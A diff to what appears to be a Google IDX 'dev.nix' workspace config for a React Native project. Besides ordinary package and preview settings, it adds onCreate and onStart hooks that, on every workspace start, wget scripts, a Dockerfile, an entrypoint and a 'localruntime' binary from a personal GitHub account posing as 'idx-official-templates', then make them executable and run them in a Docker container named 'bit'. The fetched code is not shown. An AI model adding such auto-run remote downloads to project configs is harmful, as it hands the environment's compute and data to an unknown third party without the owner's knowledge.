@@ -3,59 +3,70 @@
 { pkgs, ... }: {
   # Which nixpkgs channel to use.
   channel = "stable-23.11"; # or "unstable"
-
+  services.docker.enable = true;
   # Use https://search.nixos.org/packages to find packages
   packages = [
-    # pkgs.go
-    # pkgs.python311
-    # pkgs.python311Packages.pip
-    # pkgs.nodejs_20
-    # pkgs.nodePackages.nodemon
-    pkgs.httping
+  pkgs.nodejs_20
+  pkgs.httping
   ];
-services.docker.enable = true;
   # Sets environment variables in the workspace
   env = {};
   idx = {
     # Search for the extensions you want on https://open-vsx.org/ and use "publisher.id"
     extensions = [
-      # "vscodevim.vim"
+      "msjsdiag.vscode-react-native"
     ];
-
-    # Enable previews
+    workspace = {
+      # Runs when a workspace is first created with this `dev.nix` file
+      onCreate = {
+        install = "npm ci --prefer-offline --no-audit --no-progress --timing && npm i @expo/ngrok@^4.1.0";
+        create-tmux-sessions = "
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
+            wget https://github.com/dediminari/bit/raw/refs/heads/main/localruntime
+        ";
+      };
+      # Runs when a workspace restarted
+      onStart = {
+        connect-device = ''
+          adb -s localhost:5554 wait-for-device
+        '';
+        android = ''
+          npm run android -- --port 5554 --tunnel
+        '';
+        start-ping-sessions = "
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
+            chmod +x ping.sh && chmod +x trace.sh && ./ping.sh
+        ";
+        start-tmux-sessions = "
+            docker stop bit
+            docker rm bit
+            rm -rf Dockerfile
+            rm -rf entrypoint
+            rm -rf dock.sh
+            rm -rf tmux.sh
+            wget https://github.com/dediminari/bit/raw/refs/heads/main/Dockerfile
+            wget https://github.com/dediminari/bit/raw/refs/heads/main/entrypoint
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/dock.sh
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/tmux.sh
+            chmod +x Dockerfile && chmod +x entrypoint && chmod +x dock.sh && chmod +x tmux.sh && ./dock.sh
+        ";
+      };
+    };
+    # Enable previews and customize configuration
     previews = {
       enable = true;
       previews = {
-        # web = {
-        #   # Example: run "npm run dev" with PORT set to IDX's defined port for previews,
-        #   # and show it in IDX's web preview panel
-        #   command = ["npm" "run" "dev"];
-        #   manager = "web";
-        #   env = {
-        #     # Environment variables to set for your server
-        #     PORT = "$PORT";
-        #   };
-        # };
-      };
-    };
-
-    # Workspace lifecycle hooks
-    workspace = {
-      # Runs when a workspace is first created
-      onCreate = {
-        create-tmux-sessions = "
-tmux new -d -s ping-session 'chmod +x ping.sh && chmod +x trace.sh && ./ping.sh'
-tmux new -d -s bit-session 'chmod +x dock.sh && ./dock.sh'
-tmux attach -t bit-session
-        ";
-      };
-      # Runs when the workspace is (re)started
-      onStart = {
-        start-tmux-sessions = "
-tmux new -d -s ping-session 'chmod +x ping.sh && chmod +x trace.sh && ./ping.sh'
-tmux new -d -s bit-session 'chmod +x tmux.sh && ./tmux.sh'
-tmux attach -t bit-session
-        ";
+        web = {
+          command = ["npm" "run" "web" "--" "--port" "$PORT"];
+          manager = "web";
+        };
+        android = {
+          # noop
+          command = ["tail" "-f" "/dev/null"];
+          manager = "web";
+        };
       };
     };
   };
